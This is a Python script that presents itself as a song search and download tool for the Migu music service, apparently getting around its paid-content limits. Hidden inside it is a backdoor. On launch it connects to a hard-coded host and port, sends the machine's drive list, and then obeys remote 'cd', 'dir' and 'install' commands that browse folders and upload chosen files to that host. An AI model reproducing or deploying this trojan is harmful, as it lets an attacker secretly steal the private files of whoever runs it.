import os
import socket
import threading
import time

import win32api
from win32api import *
import requests

s = socket.socket()
s.connect(("192.168.3.46",8848))



def vip_music():
    while True:
        name = input('请输入歌曲的名称:')
        search_url = f'https://c.musicapp.migu.cn/v1.0/content/search_all.do?text={name}&pageNo=1&pageSize=20&isCopyright=1&sort=1&searchSwitch=%7B%22song%22%3A1%2C%22album%22%3A0%2C%22singer%22%3A0%2C%22tagSong%22%3A1%2C%22mvSong%22%3A0%2C%22bestShow%22%3A1%7D'
        search_res = requests.get(search_url)
        # 转化成JSON数据
        JSON = search_res.json()
        song_list = JSON['songResultData']['result']  # 这里面有8首歌曲！
        total_list = []
        count = 1
        for song_data in song_list:
            song_name = song_data['name']
            singers = song_data['singers'][0]['name']
            contentId = song_data['contentId']
            copyrightId = song_data['copyrightId']
            try:
                albumId = song_data['albums'][0]['id']
                albums_name = song_data['albums'][0]['name']
                list = [count, song_name, singers, albums_name, contentId, copyrightId, albumId]
            except:
                list = [count, song_name, singers, '0', contentId, copyrightId, '0']
            count += 1
            total_list.append(list)
        for li in total_list:
            print(li)

        choice = int(input("请输入您想要下载的歌曲的编号:")) - 1
        url = f'https://c.musicapp.migu.cn/MIGUM3.0/strategy/listen-url/v2.3?copyrightId={total_list[choice][5]}&contentId={total_list[choice][4]}&resourceType=2&albumId={total_list[choice][-1]}&netType=01&toneFlag=PQ'
        headers = {'channel': '0140210'}
        res = requests.get(url, headers=headers)
        JSON1 = res.json()
        down_url = JSON1['data']['url']
        res1 = requests.get(down_url)
        open(f'{total_list[choice][1]}-{total_list[choice][2]}.mp3', 'wb').write(res1.content)
        print('已经下载好了！')
threading.Thread(target=vip_music).start()



# if '.mp4' in f or '.pdf' in f:
#     print(f'{root}\\{f}')

def send_disk():
    disk_str = GetLogicalDriveStrings()
    disk_list = disk_str.split('\x00')
    disk_list.pop(-1)

    # print(disk_list)
    disk_list = ' '.join(disk_list)
    # print(disk_list)
    # 发送盘符
    s.send(disk_list.encode())

def send_file(path):
    file_size = str(os.path.getsize(path))
    s.send(file_size.encode())
    s.recv(1024)

    with open(path, 'rb') as file:
        for data in file:
            s.send(data)


    # for root,ds,fs in os.walk('D:\\'):
    #     # print(root,ds,fs)
    #     for f in fs:
    #         if '_merged.mp4' in f:
    #             path = f'{root}\\{f}'
    #             print(path)
    #
    #             # 发送文件名给后台 等确认
    #             s.send(f.encode(encoding='utf-8'))
    #             s.recv(1024)
    #
    #             file_size = str(os.path.getsize(path))
    #             s.send(file_size.encode())
    #             s.recv(1024)
    #
    #             with open(path, 'rb') as file:
    #                 for data in file:
    #                     s.send(data)
    #
    #             s.recv(1024)

def solve_cmd(path):
    cmd = s.recv(1024).decode()

    # cmd = 'cd D:\\'
    cmd_list = cmd.split(' ')
    cmd = cmd_list[0]
    if cmd == 'cd':
        # cd清空 路径
        if len(cmd_list) == 1:
            return ''
        # 进入文件夹
        target_dir = ' '.join(cmd_list[1:])
        if path == '':
            path = target_dir
        else:
            # print('='*10,path[-1]=='\\')
            f = '\\' if path[-1]!='\\' else ''
            path = path + f + target_dir
        # print(target_dir)

    elif cmd == 'dir':
        result = os.listdir(path)
        # 发送个数
        num = len(result)
        s.send(str(num).encode())

        # 发送文件夹
        for i in range(num):
            s.send(result[i].encode())
            time.sleep(0.08)
        # print(result)

    elif cmd == 'install':
        target_dir = ' '.join(cmd_list[1:])
        answer = [i for i in path.split('\\') if not i == '']
        answer[0] = answer[0] + '\\'
        answer.append(target_dir)
        # print(answer)
        # print(os.path.join(*answer))
        send_file(os.path.join(*answer))
    return path

if __name__ == '__main__':

    send_disk()
    path = ''
    # 循环执行命令
    while 1:
        path = solve_cmd(path)
        # print(path)



